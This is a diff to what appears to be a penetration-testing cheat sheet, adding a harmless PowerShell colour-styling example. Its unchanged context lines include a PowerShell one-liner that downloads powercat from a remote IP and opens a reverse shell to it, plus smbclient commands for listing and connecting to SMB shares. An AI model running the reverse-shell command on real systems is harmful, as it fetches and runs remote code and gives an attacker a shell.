@@ -135,6 +135,11 @@
    - https://github.com/besimorhino/powercat
    - ``` Powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.49.211/powercat.ps1');powercat -c 192.168.49.211 -p 5555 -e cmd ```
 
+3. Powershell color enable
+   ```
+    "$($PSStyle.Background.BrightCyan)Power$($PSStyle.Underline)$($PSStyle.Bold)Shell$($PSStyle.Reset)"
+   ```
+
 # SMB 
 1. List shares: ``` smbclient -L \\{IP}\ -N ```
 2. Connect to share ``` smbclient \\\\{IP}\\{share} -U '{domain}\{username}%{password}' ```
@@ -162,3 +167,5 @@
 
   Level 4: Even more detailed information, including all the above and security identifier (SID).
 ```
+
+
